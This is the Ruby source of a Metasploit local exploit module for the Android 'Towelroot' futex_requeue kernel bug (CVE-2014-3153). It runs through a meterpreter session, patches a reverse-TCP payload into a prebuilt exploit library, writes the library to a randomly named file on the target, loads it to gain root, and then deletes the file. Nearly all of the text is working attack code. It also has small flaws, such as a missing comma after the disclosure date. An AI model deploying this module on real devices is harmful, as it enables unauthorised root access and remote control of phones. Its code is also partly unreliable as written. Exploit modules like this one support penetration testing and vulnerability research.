##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Common

  def initialize(info={})
    super( update_info( info, {
        'Name'          => "Android 'Towelroot' Futex Requeue Kernel Exploit",
        'Description'   => %q{
            This module exploits a bug in futex_requeue in the Linux kernel, using
            similiar techniques employed by the towelroot exploit. Any Android device
            with a kernel built before June 2014 is likely to be vulnerable.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [
            'Pinkie Pie', # discovery
            'geohot',     # towelroot
            'timwr'       # metasploit module
        ],
        'References'    =>
        [
            [ 'CVE', '2014-3153' ],
            [ 'URL', 'http://tinyhack.com/2014/07/07/exploiting-the-futex-bug-and-uncovering-towelroot/' ],
            [ 'URL', 'http://blog.nativeflow.com/the-futex-vulnerability' ],
        ],
        'DisclosureDate' => "May 03 2014"
        'SessionTypes'   => [ 'meterpreter' ],
        "Platform"       => [ "android", "linux" ],
        'Targets'        => [[ 'Automatic', { }]],
        'Payload'        => { 'Space'    => 2048, },
        "Arch"           => ARCH_ARMLE,
        'DefaultOptions' =>
        {
          'PAYLOAD'      => 'linux/armle/mettle/reverse_tcp',
        },
        'DefaultTarget' => 0,
      }
    ))
    register_options(
      [
        OptInt.new("ListenerTimeout", [ true, "The maximum number of seconds to wait for a session", 300])
      ], self.class)
  end

  def exploit
    local_file = File.join( Msf::Config.data_directory, "exploits", "CVE-2014-3153.so" )
    exploit_data = File.read(local_file, {:mode => 'rb'})

    space = payload_space
    payload_encoded = payload.encoded

    # Substitute the exploit shellcode with our own
    exploit_data.gsub!("\x90" * 4 + "\x00" * (space - 4), payload_encoded + "\x90" * (payload_encoded.length - space))

    workingdir = session.fs.dir.getwd
    remote_file = "#{workingdir}/#{Rex::Text::rand_text_alpha_lower(5)}"
    write_file(remote_file, exploit_data)

    print_status("Loading exploit library #{remote_file}")
    old_timeout = session.response_timeout
    print_status("Be patient, this exploit will automatically timeout after #{datastore['ListenerTimeout']} seconds")
    session.response_timeout = datastore['ListenerTimeout']
    session.core.load_library(
        'LibraryFilePath' => local_file,
        'TargetFilePath'  => remote_file,
        'UploadLibrary'   => false,
        'Extension'       => false,
        'SaveToDisk'      => false
    )
    session.response_timeout = old_timeout
    print_status("Loaded library #{remote_file}")
    session.fs.file.rm(remote_file)
    print_status("Library #{remote_file} was deleted")
  end
end

